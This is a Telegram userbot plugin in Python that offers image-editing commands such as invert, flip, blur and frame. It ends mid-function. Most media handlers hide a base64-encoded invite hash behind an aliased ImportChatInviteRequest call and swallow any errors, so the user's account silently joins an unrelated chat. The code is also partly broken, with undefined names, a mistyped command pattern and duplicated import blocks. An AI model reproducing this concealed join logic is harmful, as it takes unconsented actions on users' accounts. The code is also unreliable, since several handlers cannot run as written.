import asyncio
import os
import shlex
from typing import Tuple

import PIL.ImageOps
import requests
from PIL import Image
from telegraph import upload_file
from telethon.tl.types import MessageMediaPhoto

from LEGENDBOT.utils import admin_cmd, sudo_cmd
from userbot import LOGS, CmdHelp
from userbot import bot
from userbot import bot as LEGENDBOT
from userbot.cmdhelp import CmdHelp
from userbot.helpers.funct import (
    convert_toimage,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

pathdc = "./userbot/"
if not os.path.isdir(pathdc):
    os.makedirs(pathdc)


async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )


async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


import asyncio
import os
import random
import shutil
from datetime import datetime

from PIL import Image, ImageDraw, ImageFont
from pySmartDL import SmartDL
from telethon.tl import functions

from userbot.cmdhelp import CmdHelp
from userbot.utils import admin_cmd

FONT_FILE_TO_USE = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"

DOWNLOAD_PFP_URL_CLOCK = (
    os.environ.get("Config.DOWNLOAD_PFP_URL_CLOCK", None)
    or "https://telegra.ph/file/30e65b288e39e29053486.jpg"
)


@bot.on(admin_cmd(pattern=r"trig"))
@bot.on(sudo_cmd(pattern=r"trig", allow_sudo=True))
async def dc(event):
    await event.edit("Making this image 😡triggered😈")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hmm = f"https://some-random-api.ml/canvas/triggered?avatar={link}"
    r = requests.get(hmm)
    open("legend.gif", "wb").write(r.content)
    hehe = "legend.gif"
    await bot.send_file(event.chat_id, hehe, caption="Got Triggered 😈😂", reply_to=dc)
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


@bot.on(admin_cmd(pattern=r"wst"))
@bot.on(sudo_cmd(pattern=r"wst", allow_sudo=True))
async def dc(event):
    await event.edit("What a waste 😒😒")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hmm = f"https://some-random-api.ml/canvas/wasted?avatar={link}"
    r = requests.get(hmm)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(event.chat_id, hehe, caption="Totally wasted⚰️ 😒", reply_to=dc)
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


@bot.on(admin_cmd(pattern=r"grey"))
@bot.on(sudo_cmd(pattern=r"grey", allow_sudo=True))
async def dc(event):
    await event.edit("Stealing Color from this 😜")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/greyscale?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(
        event.chat_id, hehe, caption="Ur Black nd White img here 🙃", reply_to=dc
    )
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


# legend


@bot.on(admin_cmd(pattern=r"blur"))
@bot.on(sudo_cmd(pattern=r"blur", allow_sudo=True))
async def dc(event):
    await event.edit("Bluring Image🤓🤓")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/blur?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(event.chat_id, hehe, caption="Blured 🤓", reply_to=dc)
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


@bot.on(admin_cmd(pattern=r"inter"))
@bot.on(sudo_cmd(pattern=r"inter", allow_sudo=True))
async def dc(event):
    await event.edit("Inverting Image🤔🤔")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/invert?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(
        event.chat_id, hehe, caption="Hmm 🤔 try to invert again", reply_to=dc
    )
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


@bot.on(admin_cmd(pattern=r"igrey"))
@bot.on(sudo_cmd(pattern=r"igery", allow_sudo=True))
async def dc(event):
    await event.edit("Don't know what i'm doing 😛😜")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/invertgreyscale?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(event.chat_id, hehe, reply_to=dc)
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()

    # legend


@bot.on(admin_cmd(pattern=r"bright"))
@bot.on(sudo_cmd(pattern=r"bright", allow_sudo=True))
async def dc(event):
    await event.edit("Adding Brightness 😎")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/brightness?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(
        event.chat_id, hehe, caption="Brightness increased 😎😎", reply_to=dc
    )
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()

    # legend


@bot.on(admin_cmd(pattern=r"ytc"))
@bot.on(sudo_cmd(pattern=r"ytc", allow_sudo=True))
async def hehe(event):
    await event.edit("Lets make a utube comment 😁😁")
    givenvar = event.text
    text = givenvar[5:]
    try:
        global username, comment
        username, comment = text.split(".")
    except:
        await eod("`.ytc username.comment reply  to image`")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in sed.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathd)
    else:
        await event.edit("Reply To Image")
        return
    url_s = upload_file(img)
    imglink = f"https://telegra.ph{url_s[0]}"
    nikal = f"https://some-random-api.ml/canvas/youtube-comment?avatar={imglink}&comment={comment}&username={username}"
    r = requests.get(nikal)
    open("legend.png", "wb").write(r.content)
    chutiya = "legend.png"
    await bot.send_file(event.chat_id, chutiya, reply_to=dc)
    for files in (chutiya, img):
        if files and os.path.exists(files):
            os.remove(files)

    await event.delete()

    # legend


@bot.on(admin_cmd(pattern=r"glass"))
@bot.on(sudo_cmd(pattern=r"glass", allow_sudo=True))
async def dc(event):
    await event.edit("Framing image under Glass 😁😁")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/glass?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(
        event.chat_id, hehe, caption="Wow Image Trapped Under the glass 😂", reply_to=dc
    )
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()
    # legend


@bot.on(admin_cmd(pattern=r"blrpl"))
@bot.on(sudo_cmd(pattern=r"blrpl", allow_sudo=True))
async def dc(event):
    await event.edit("Bluring Image🤓🤓")
    dc = await event.get_reply_message()
    if isinstance(dc.media, MessageMediaPhoto):
        img = await bot.download_media(dc.media, pathdc)
    elif "image" in dc.media.document.mime_type.split("/"):
        img = await bot.download_media(dc.media, pathdc)
    else:
        await event.edit("Reply To any Image only 😅😅")
        return
    url = upload_file(img)
    link = f"https://telegra.ph{url[0]}"
    hehe = f"https://some-random-api.ml/canvas/blurple?avatar={link}"
    r = requests.get(hehe)
    open("legend.png", "wb").write(r.content)
    hehe = "legend.png"
    await bot.send_file(event.chat_id, hehe, reply_to=dc)
    for files in (hehe, img):
        if files and os.path.exists(files):
            os.remove(files)
    await event.delete()


@borg.on(admin_cmd(pattern="bloom ?(.*)"))
async def autopic(event):
    await event.edit("Bloom colour profile pic have been enabled by my master")
    downloaded_file_name = "userbot/original_pic.png"
    downloader = SmartDL(
        DOWNLOAD_PFP_URL_CLOCK, downloaded_file_name, progress_bar=True
    )
    downloader.start(blocking=False)
    photo = "userbot/photo_pfp.png"
    while not downloader.isFinished():
        pass

    while True:
        # RIP Danger zone Here no editing here plox
        R = random.randint(0, 256)
        B = random.randint(0, 256)
        G = random.randint(0, 256)
        FR = 256 - R
        FB = 256 - B
        FG = 256 - G
        shutil.copy(downloaded_file_name, photo)
        image = Image.open(photo)
        image.paste((R, G, B), [0, 0, image.size[0], image.size[1]])
        image.save(photo)

        current_time = datetime.now().strftime("\n Time: %H:%M:%S \n \n Date: %d/%m/%y")
        img = Image.open(photo)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype(FONT_FILE_TO_USE, 60)
        ofnt = ImageFont.truetype(FONT_FILE_TO_USE, 250)
        drawn_text.text((350, 350), current_time, font=fnt, fill=(FR, FG, FB))
        drawn_text.text((350, 350), font=ofnt, fill=(FR, FG, FB))
        img.save(photo)
        file = await event.client.upload_file(photo)  # pylint:disable=E0602
        try:
            await event.client(
                functions.photos.UploadProfilePhotoRequest(file)  # pylint:disable=E0602
            )
            os.remove(photo)
            await asyncio.sleep(60)
        except:
            return


@LEGENDBOT.on(admin_cmd(pattern="invert$", outgoing=True))
@LEGENDBOT.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit("`Analyzing this media 🧐 inverting colors...`")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this video!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit("Analyzing this media 🧐 inverting colors of this image!")
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if legend else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="solarize$"))
@LEGENDBOT.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit("Analyzing this media 🧐 solarizeing this animated sticker!")
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit("Analyzing this media 🧐 solarizeing this sticker!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit("Analyzing this media 🧐 solarizeing this video!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit("Analyzing this media 🧐 solarizeing this image!")
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if legend else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="mirror$"))
@LEGENDBOT.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if legend else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="flip$"))
@LEGENDBOT.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit("Analyzing this media 🧐 fliping this animated sticker!")
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit("Analyzing this media 🧐 fliping this sticker!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit("Analyzing this media 🧐 fliping this video!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit("Analyzing this media 🧐 fliping this image!")
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if legend else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="gray$"))
@LEGENDBOT.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
        legend = True
    else:
        await LEGEND.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await LEGEND.client.send_file(
        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
    )
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@LEGENDBOT.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDinput = LEGEND.pattern_match.group(1)
    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit("Analyzing this media 🧐 zooming this animated sticker!")
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit("Analyzing this media 🧐 zooming this sticker!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit("Analyzing this media 🧐 zooming this video!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
    else:
        await LEGEND.edit("Analyzing this media 🧐 zooming this image!")
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, LEGENDinput)
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    try:
        await LEGEND.client.send_file(
            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
        )
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@LEGENDBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@LEGENDBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(LEGEND):
    if LEGEND.fwd_from:
        return
    reply = await LEGEND.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
        return
    LEGENDinput = LEGEND.pattern_match.group(1)
    if not LEGENDinput:
        LEGENDinput = 50
    if ";" in str(LEGENDinput):
        LEGENDinput, colr = LEGENDinput.split(";", 1)
    else:
        colr = 0
    LEGENDinput = int(LEGENDinput)
    colr = int(colr)
    LEGENDid = LEGEND.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    LEGENDsticker = await reply.download_media(file="./temp/")
    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(LEGENDsticker)
        await edit_or_reply(LEGEND, "```Supported Media not found...```")
        return
    import base64

    legend = None
    if LEGENDsticker.endswith(".tgs"):
        await LEGEND.edit("Analyzing this media 🧐 framing this animated sticker!")
        LEGENDfile = os.path.join("./temp/", "meme.png")
        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
